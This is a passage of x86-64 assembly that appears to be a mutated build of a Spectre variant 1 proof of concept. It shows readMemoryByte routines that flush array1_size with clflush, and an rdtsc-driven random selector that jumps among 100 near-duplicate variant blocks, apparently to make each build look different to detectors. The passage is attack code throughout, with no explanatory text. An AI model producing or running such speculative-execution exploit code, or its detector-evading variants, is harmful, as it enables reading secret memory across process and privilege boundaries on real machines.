.LreadMemoryByte_win10_var60:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 61
.LreadMemoryByte_win10_var61:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 62
.LreadMemoryByte_win10_var62:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 63
.LreadMemoryByte_win10_var63:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 64
.LreadMemoryByte_win10_var64:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 65
.LreadMemoryByte_win10_var65:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 66
.LreadMemoryByte_win10_var66:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 67
.LreadMemoryByte_win10_var67:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 68
.LreadMemoryByte_win10_var68:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 69
.LreadMemoryByte_win10_var69:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 70
.LreadMemoryByte_win10_var70:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 71
.LreadMemoryByte_win10_var71:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 72
.LreadMemoryByte_win10_var72:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 73
.LreadMemoryByte_win10_var73:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 74
.LreadMemoryByte_win10_var74:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 75
.LreadMemoryByte_win10_var75:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 76
.LreadMemoryByte_win10_var76:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 77
.LreadMemoryByte_win10_var77:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 78
.LreadMemoryByte_win10_var78:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 79
.LreadMemoryByte_win10_var79:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 80
.LreadMemoryByte_win10_var80:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 81
.LreadMemoryByte_win10_var81:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 82
.LreadMemoryByte_win10_var82:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 83
.LreadMemoryByte_win10_var83:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 84
.LreadMemoryByte_win10_var84:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 85
.LreadMemoryByte_win10_var85:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 86
.LreadMemoryByte_win10_var86:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 87
.LreadMemoryByte_win10_var87:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 88
.LreadMemoryByte_win10_var88:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 89
.LreadMemoryByte_win10_var89:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 90
.LreadMemoryByte_win10_var90:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 91
.LreadMemoryByte_win10_var91:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 92
.LreadMemoryByte_win10_var92:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 93
.LreadMemoryByte_win10_var93:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 94
.LreadMemoryByte_win10_var94:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 95
.LreadMemoryByte_win10_var95:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 96
.LreadMemoryByte_win10_var96:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 97
.LreadMemoryByte_win10_var97:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 98
.LreadMemoryByte_win10_var98:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 99
.LreadMemoryByte_win10_var99:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
.LreadMemoryByte_win10_continue:
	addq	$32, %rsp
	movl	$0, %edx
	divl	%ecx
	movl	%edx, %eax
	movl	%eax, %eax
	movq	%rax, -80(%rbp)
	movl	$59, -92(%rbp)
	jmp	.L10
.L13:
	leaq	array1_size(%rip), %rax
	movq	%rax, -48(%rbp)
	movq	-48(%rbp), %rax
	clflush	(%rax)
	nop
	movl	$0, -104(%rbp)
	jmp	.L11
.L12:
	movl	-104(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -104(%rbp)
.L11:
	movl	-104(%rbp), %eax
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win9_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win9_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win9_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win9_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win9_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win9_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win9_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win9_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win9_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win9_var9
	cmpl	$10, %eax
	je	.LreadMemoryByte_win9_var10
	cmpl	$11, %eax
	je	.LreadMemoryByte_win9_var11
	cmpl	$12, %eax
	je	.LreadMemoryByte_win9_var12
	cmpl	$13, %eax
	je	.LreadMemoryByte_win9_var13
	cmpl	$14, %eax
	je	.LreadMemoryByte_win9_var14
	cmpl	$15, %eax
	je	.LreadMemoryByte_win9_var15
	cmpl	$16, %eax
	je	.LreadMemoryByte_win9_var16
	cmpl	$17, %eax
	je	.LreadMemoryByte_win9_var17
	cmpl	$18, %eax
	je	.LreadMemoryByte_win9_var18
	cmpl	$19, %eax
	je	.LreadMemoryByte_win9_var19
	cmpl	$20, %eax
	je	.LreadMemoryByte_win9_var20
	cmpl	$21, %eax
	je	.LreadMemoryByte_win9_var21
	cmpl	$22, %eax
	je	.LreadMemoryByte_win9_var22
	cmpl	$23, %eax
	je	.LreadMemoryByte_win9_var23
	cmpl	$24, %eax
	je	.LreadMemoryByte_win9_var24
	cmpl	$25, %eax
	je	.LreadMemoryByte_win9_var25
	cmpl	$26, %eax
	je	.LreadMemoryByte_win9_var26
	cmpl	$27, %eax
	je	.LreadMemoryByte_win9_var27
	cmpl	$28, %eax
	je	.LreadMemoryByte_win9_var28
	cmpl	$29, %eax
	je	.LreadMemoryByte_win9_var29
	cmpl	$30, %eax
	je	.LreadMemoryByte_win9_var30
	cmpl	$31, %eax
	je	.LreadMemoryByte_win9_var31
	cmpl	$32, %eax
	je	.LreadMemoryByte_win9_var32
	cmpl	$33, %eax
	je	.LreadMemoryByte_win9_var33
	cmpl	$34, %eax
	je	.LreadMemoryByte_win9_var34
	cmpl	$35, %eax
	je	.LreadMemoryByte_win9_var35
	cmpl	$36, %eax
	je	.LreadMemoryByte_win9_var36
	cmpl	$37, %eax
	je	.LreadMemoryByte_win9_var37
	cmpl	$38, %eax
	je	.LreadMemoryByte_win9_var38
	cmpl	$39, %eax
	je	.LreadMemoryByte_win9_var39
	cmpl	$40, %eax
	je	.LreadMemoryByte_win9_var40
	cmpl	$41, %eax
	je	.LreadMemoryByte_win9_var41
	cmpl	$42, %eax
	je	.LreadMemoryByte_win9_var42
	cmpl	$43, %eax
	je	.LreadMemoryByte_win9_var43
	cmpl	$44, %eax
	je	.LreadMemoryByte_win9_var44
	cmpl	$45, %eax
	je	.LreadMemoryByte_win9_var45
	cmpl	$46, %eax
	je	.LreadMemoryByte_win9_var46
	cmpl	$47, %eax
	je	.LreadMemoryByte_win9_var47
	cmpl	$48, %eax
	je	.LreadMemoryByte_win9_var48
	cmpl	$49, %eax
	je	.LreadMemoryByte_win9_var49
	cmpl	$50, %eax
	je	.LreadMemoryByte_win9_var50
	cmpl	$51, %eax
	je	.LreadMemoryByte_win9_var51
	cmpl	$52, %eax
	je	.LreadMemoryByte_win9_var52
	cmpl	$53, %eax
	je	.LreadMemoryByte_win9_var53
	cmpl	$54, %eax
	je	.LreadMemoryByte_win9_var54
	cmpl	$55, %eax
	je	.LreadMemoryByte_win9_var55
	cmpl	$56, %eax
	je	.LreadMemoryByte_win9_var56
	cmpl	$57, %eax
	je	.LreadMemoryByte_win9_var57
	cmpl	$58, %eax
	je	.LreadMemoryByte_win9_var58
	cmpl	$59, %eax
	je	.LreadMemoryByte_win9_var59
	cmpl	$60, %eax
	je	.LreadMemoryByte_win9_var60
	cmpl	$61, %eax
	je	.LreadMemoryByte_win9_var61
	cmpl	$62, %eax
	je	.LreadMemoryByte_win9_var62
	cmpl	$63, %eax
	je	.LreadMemoryByte_win9_var63
	cmpl	$64, %eax
	je	.LreadMemoryByte_win9_var64
	cmpl	$65, %eax
	je	.LreadMemoryByte_win9_var65
	cmpl	$66, %eax
	je	.LreadMemoryByte_win9_var66
	cmpl	$67, %eax
	je	.LreadMemoryByte_win9_var67
	cmpl	$68, %eax
	je	.LreadMemoryByte_win9_var68
	cmpl	$69, %eax
	je	.LreadMemoryByte_win9_var69
	cmpl	$70, %eax
	je	.LreadMemoryByte_win9_var70
	cmpl	$71, %eax
	je	.LreadMemoryByte_win9_var71
	cmpl	$72, %eax
	je	.LreadMemoryByte_win9_var72
	cmpl	$73, %eax
	je	.LreadMemoryByte_win9_var73
	cmpl	$74, %eax
	je	.LreadMemoryByte_win9_var74
	cmpl	$75, %eax
	je	.LreadMemoryByte_win9_var75
	cmpl	$76, %eax
	je	.LreadMemoryByte_win9_var76
	cmpl	$77, %eax
	je	.LreadMemoryByte_win9_var77
	cmpl	$78, %eax
	je	.LreadMemoryByte_win9_var78
	cmpl	$79, %eax
	je	.LreadMemoryByte_win9_var79
	cmpl	$80, %eax
	je	.LreadMemoryByte_win9_var80
	cmpl	$81, %eax
	je	.LreadMemoryByte_win9_var81
	cmpl	$82, %eax
	je	.LreadMemoryByte_win9_var82
	cmpl	$83, %eax
	je	.LreadMemoryByte_win9_var83
	cmpl	$84, %eax
	je	.LreadMemoryByte_win9_var84
	cmpl	$85, %eax
	je	.LreadMemoryByte_win9_var85
	cmpl	$86, %eax
	je	.LreadMemoryByte_win9_var86
	cmpl	$87, %eax
	je	.LreadMemoryByte_win9_var87
	cmpl	$88, %eax
	je	.LreadMemoryByte_win9_var88
	cmpl	$89, %eax
	je	.LreadMemoryByte_win9_var89
	cmpl	$90, %eax
	je	.LreadMemoryByte_win9_var90
	cmpl	$91, %eax
	je	.LreadMemoryByte_win9_var91
	cmpl	$92, %eax
	je	.LreadMemoryByte_win9_var92
	cmpl	$93, %eax
	je	.LreadMemoryByte_win9_var93
	cmpl	$94, %eax
	je	.LreadMemoryByte_win9_var94
	cmpl	$95, %eax
	je	.LreadMemoryByte_win9_var95
	cmpl	$96, %eax
	je	.LreadMemoryByte_win9_var96
	cmpl	$97, %eax
	je	.LreadMemoryByte_win9_var97
	cmpl	$98, %eax
	je	.LreadMemoryByte_win9_var98
	cmpl	$99, %eax
	je	.LreadMemoryByte_win9_var99
	jmp	.LreadMemoryByte_win9_var0
## Variant 0
.LreadMemoryByte_win9_var0:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 1
.LreadMemoryByte_win9_var1:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 2
.LreadMemoryByte_win9_var2:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 3
.LreadMemoryByte_win9_var3:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 4
.LreadMemoryByte_win9_var4:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 5
.LreadMemoryByte_win9_var5:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 6
.LreadMemoryByte_win9_var6:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 7
.LreadMemoryByte_win9_var7:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 8
.LreadMemoryByte_win9_var8:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 9
.LreadMemoryByte_win9_var9:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 10
.LreadMemoryByte_win9_var10:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 11
.LreadMemoryByte_win9_var11:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 12
.LreadMemoryByte_win9_var12:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 13
.LreadMemoryByte_win9_var13:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 14
.LreadMemoryByte_win9_var14:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 15
.LreadMemoryByte_win9_var15:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 16
.LreadMemoryByte_win9_var16:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 17
.LreadMemoryByte_win9_var17:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 18
.LreadMemoryByte_win9_var18:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 19
.LreadMemoryByte_win9_var19:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 20
.LreadMemoryByte_win9_var20:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 21
.LreadMemoryByte_win9_var21:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 22
.LreadMemoryByte_win9_var22:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 23
.LreadMemoryByte_win9_var23:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 24
.LreadMemoryByte_win9_var24:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 25
.LreadMemoryByte_win9_var25:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 26
.LreadMemoryByte_win9_var26:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 27
.LreadMemoryByte_win9_var27:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 28
.LreadMemoryByte_win9_var28:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 29
.LreadMemoryByte_win9_var29:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 30
.LreadMemoryByte_win9_var30:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 31
.LreadMemoryByte_win9_var31:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 32
.LreadMemoryByte_win9_var32:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 33
.LreadMemoryByte_win9_var33:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 34
.LreadMemoryByte_win9_var34:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 35
.LreadMemoryByte_win9_var35:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 36
.LreadMemoryByte_win9_var36:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 37
.LreadMemoryByte_win9_var37:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 38
.LreadMemoryByte_win9_var38:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 39
.LreadMemoryByte_win9_var39:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 40
.LreadMemoryByte_win9_var40:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 41
.LreadMemoryByte_win9_var41:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 42
.LreadMemoryByte_win9_var42:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 43
.LreadMemoryByte_win9_var43:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 44
.LreadMemoryByte_win9_var44:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 45
.LreadMemoryByte_win9_var45:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 46
.LreadMemoryByte_win9_var46:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 47
.LreadMemoryByte_win9_var47:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 48
.LreadMemoryByte_win9_var48:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 49
.LreadMemoryByte_win9_var49:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 50
.LreadMemoryByte_win9_var50:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 51
.LreadMemoryByte_win9_var51:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 52
.LreadMemoryByte_win9_var52:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 53
.LreadMemoryByte_win9_var53:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 54
.LreadMemoryByte_win9_var54:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 55
.LreadMemoryByte_win9_var55:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 56
.LreadMemoryByte_win9_var56:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 57
.LreadMemoryByte_win9_var57:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 58
.LreadMemoryByte_win9_var58:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 59
.LreadMemoryByte_win9_var59:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 60
.LreadMemoryByte_win9_var60:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 61
.LreadMemoryByte_win9_var61:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 62
.LreadMemoryByte_win9_var62:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
	jmp	.LreadMemoryByte_win9_continue
## Variant 63
.LreadMemoryByte_win9_var63:
	popq	%rax
	cmpl	$999, %eax
	jle	.L12
	lfence
	movl	-92(%rbp), %ecx
